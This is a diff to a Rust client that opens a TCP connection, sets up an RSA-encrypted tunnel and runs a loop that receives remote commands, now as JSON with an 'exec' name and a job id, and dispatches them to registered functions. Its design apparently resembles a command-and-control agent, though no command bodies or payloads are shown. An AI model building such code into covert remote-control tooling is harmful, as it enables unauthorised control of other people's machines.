@@ -1,17 +1,19 @@
-mod crypto;
 mod commands;
+mod crypto;
+mod response;
 
 use crate::crypto::EncryptedTunnel;
+use crate::response::CmdReceived;
 
+use std::collections::HashMap;
 use std::io::{self, Read, Write};
 use std::net::TcpStream;
-use std::collections::HashMap;
 
 use rand::{distributions::Alphanumeric, Rng};
 use rsa::pkcs1::DecodeRsaPublicKey;
 use rsa::{Pkcs1v15Encrypt, RsaPublicKey};
 
-type CommandFunction = Box<dyn Fn(&mut EncryptedTunnel)>;
+type CommandFunction = Box<dyn Fn(&mut EncryptedTunnel, i64)>;
 
 const BUFFER: usize = 1024;
 
@@ -32,9 +34,12 @@ fn generate_bytes(l: usize) -> Vec<u8> {
         .collect()
 }
 
-fn init_connection(mut conn: TcpStream, mut buffer: [u8; BUFFER]) -> Result<EncryptedTunnel, io::Error> {
+fn init_connection(
+    mut conn: TcpStream,
+    mut buffer: [u8; BUFFER],
+) -> Result<EncryptedTunnel, io::Error> {
     let fingerprint: String = generate_fingerprint();
-    
+
     let mut rng = rand::thread_rng();
 
     conn.write_all(fingerprint.as_bytes())?;
@@ -82,18 +87,23 @@ fn main() -> Result<(), io::Error> {
 
     loop {
         let cmd = String::from_utf8(enctunnel.recv(&mut buffer)?).unwrap();
-
         let cmd = cmd.as_str();
 
         println!("{}", cmd);
 
-        if cmd == "2" {
-            enctunnel.socket.write_all(b"3").unwrap();
-        }
-        else if commands.contains_key(cmd) {
-            match commands.get(cmd) {
-                Some(cmd_func) => cmd_func(&mut enctunnel),
-                None => (),
+        match serde_json::from_str::<CmdReceived>(cmd) {
+            Ok(cmd_json) => {
+                let cmd_exec = cmd_json.exec.as_str();
+
+                if commands.contains_key(&cmd_exec) {
+                    match commands.get(cmd_exec) {
+                        Some(cmd_func) => cmd_func(&mut enctunnel, cmd_json.job),
+                        None => (),
+                    }
+                }
+            }
+            Err(_) => {
+                enctunnel.socket.write_all(b"3").unwrap();
             }
         }
     }
